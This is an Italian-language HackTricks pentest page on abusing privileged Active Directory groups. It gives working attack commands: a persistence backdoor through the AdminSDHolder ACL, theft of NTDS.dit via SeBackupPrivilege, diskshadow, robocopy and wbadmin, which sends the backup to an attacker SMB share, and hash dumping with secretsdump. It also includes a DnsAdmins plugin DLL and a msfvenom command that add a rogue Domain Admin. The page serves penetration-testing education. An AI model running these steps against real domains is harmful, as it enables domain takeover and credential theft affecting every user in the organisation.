# Gruppi Privilegiati

{{#include ../../banners/hacktricks-training.md}}

## Gruppi Noti con privilegi di amministrazione

- **Amministratori**
- **Amministratori di Dominio**
- **Amministratori di Impresa**

## Operatori di Account

Questo gruppo ha il potere di creare account e gruppi che non sono amministratori nel dominio. Inoltre, consente il login locale al Domain Controller (DC).

Per identificare i membri di questo gruppo, viene eseguito il seguente comando:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Aggiungere nuovi utenti è consentito, così come il login locale a DC01.

## Gruppo AdminSDHolder

La Access Control List (ACL) del gruppo **AdminSDHolder** è cruciale in quanto imposta i permessi per tutti i "gruppi protetti" all'interno di Active Directory, inclusi i gruppi ad alta privilegio. Questo meccanismo garantisce la sicurezza di questi gruppi impedendo modifiche non autorizzate.

Un attaccante potrebbe sfruttare questo modificando l'ACL del gruppo **AdminSDHolder**, concedendo permessi completi a un utente standard. Questo darebbe effettivamente a quell'utente il pieno controllo su tutti i gruppi protetti. Se i permessi di questo utente vengono modificati o rimossi, verrebbero automaticamente ripristinati entro un'ora a causa del design del sistema.

I comandi per rivedere i membri e modificare i permessi includono:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
È disponibile uno script per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Per ulteriori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Cestino AD

L'appartenenza a questo gruppo consente la lettura degli oggetti di Active Directory eliminati, il che può rivelare informazioni sensibili:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accesso al Domain Controller

L'accesso ai file sul DC è limitato a meno che l'utente non faccia parte del gruppo `Server Operators`, il che cambia il livello di accesso.

### Escalation dei Privilegi

Utilizzando `PsService` o `sc` da Sysinternals, è possibile ispezionare e modificare i permessi dei servizi. Il gruppo `Server Operators`, ad esempio, ha il pieno controllo su determinati servizi, consentendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Questo comando rivela che i `Server Operators` hanno accesso completo, consentendo la manipolazione dei servizi per privilegi elevati.

## Backup Operators

L'appartenenza al gruppo `Backup Operators` fornisce accesso al file system di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi abilitano la traversata delle cartelle, l'elenco e le capacità di copia dei file, anche senza permessi espliciti, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. È necessario utilizzare script specifici per questo processo.

Per elencare i membri del gruppo, eseguire:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attacco Locale

Per sfruttare questi privilegi localmente, vengono impiegati i seguenti passaggi:

1. Importa le librerie necessarie:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Abilitare e verificare `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accedere e copiare file da directory riservate, ad esempio:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attacco AD

L'accesso diretto al file system del Domain Controller consente il furto del database `NTDS.dit`, che contiene tutti gli hash NTLM per gli utenti e i computer del dominio.

#### Utilizzando diskshadow.exe

1. Crea una copia shadow del disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copia `NTDS.dit` dalla copia shadow:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
In alternativa, usa `robocopy` per copiare file:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Estrai `SYSTEM` e `SAM` per il recupero degli hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupera tutti gli hash da `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Utilizzando wbadmin.exe

1. Configura il filesystem NTFS per il server SMB sulla macchina dell'attaccante e memorizza nella cache le credenziali SMB sulla macchina target.
2. Usa `wbadmin.exe` per il backup del sistema e l'estrazione di `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Per una dimostrazione pratica, vedere [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un potenziale di sfruttamento significativo.

Per elencare i membri del gruppo DnsAdmins, usa:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Eseguire DLL arbitrarie

I membri possono far caricare al server DNS una DLL arbitraria (sia localmente che da una condivisione remota) utilizzando comandi come:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Riavviare il servizio DNS (che potrebbe richiedere permessi aggiuntivi) è necessario affinché il DLL venga caricato:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Per ulteriori dettagli su questo vettore di attacco, fare riferimento a ired.team.

#### Mimilib.dll

È anche possibile utilizzare mimilib.dll per l'esecuzione di comandi, modificandolo per eseguire comandi specifici o reverse shell. [Controlla questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per ulteriori informazioni.

### Record WPAD per MitM

I DnsAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM) creando un record WPAD dopo aver disabilitato l'elenco globale di blocco delle query. Strumenti come Responder o Inveigh possono essere utilizzati per spoofing e cattura del traffico di rete.

### Lettori di Log degli Eventi
I membri possono accedere ai log degli eventi, trovando potenzialmente informazioni sensibili come password in chiaro o dettagli sull'esecuzione di comandi:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permessi di Windows di Exchange

Questo gruppo può modificare i DACL sui oggetti di dominio, potenzialmente concedendo privilegi DCSync. Le tecniche per l'escalation dei privilegi che sfruttano questo gruppo sono dettagliate nel repository GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Gli Hyper-V Administrators hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controllers virtualizzati. Questo include il clonaggio di DC live ed estraendo gli hash NTLM dal file NTDS.dit.

### Esempio di Sfruttamento

Il servizio di manutenzione di Mozilla Firefox può essere sfruttato dagli Hyper-V Administrators per eseguire comandi come SYSTEM. Questo comporta la creazione di un hard link a un file SYSTEM protetto e la sua sostituzione con un eseguibile malevolo:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Lo sfruttamento dei hard link è stato mitigato negli aggiornamenti recenti di Windows.

## Gestione dell'Organizzazione

Negli ambienti in cui è distribuito **Microsoft Exchange**, un gruppo speciale noto come **Organization Management** detiene capacità significative. Questo gruppo ha il privilegio di **accedere alle cassette postali di tutti gli utenti del dominio** e mantiene **il pieno controllo sull'Unità Organizzativa (OU) 'Microsoft Exchange Security Groups'**. Questo controllo include il gruppo **`Exchange Windows Permissions`**, che può essere sfruttato per l'escalation dei privilegi.

### Sfruttamento dei Privilegi e Comandi

#### Operatori di Stampa

I membri del gruppo **Print Operators** sono dotati di diversi privilegi, incluso il **`SeLoadDriverPrivilege`**, che consente loro di **accedere localmente a un Domain Controller**, spegnerlo e gestire le stampanti. Per sfruttare questi privilegi, specialmente se **`SeLoadDriverPrivilege`** non è visibile in un contesto non elevato, è necessario bypassare il Controllo Account Utente (UAC).

Per elencare i membri di questo gruppo, viene utilizzato il seguente comando PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Per tecniche di sfruttamento più dettagliate relative a **`SeLoadDriverPrivilege`**, è opportuno consultare risorse di sicurezza specifiche.

#### Utenti Desktop Remoto

I membri di questo gruppo hanno accesso ai PC tramite il Protocollo Desktop Remoto (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Ulteriori informazioni sull'exploitation di RDP possono essere trovate in risorse dedicate al pentesting.

#### Utenti di gestione remota

I membri possono accedere ai PC tramite **Windows Remote Management (WinRM)**. L'enumerazione di questi membri si ottiene attraverso:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Per le tecniche di sfruttamento relative a **WinRM**, è necessario consultare documentazione specifica.

#### Server Operators

Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controllers, inclusi privilegi di backup e ripristino, modifica dell'ora di sistema e spegnimento del sistema. Per enumerare i membri, il comando fornito è:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Riferimenti <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
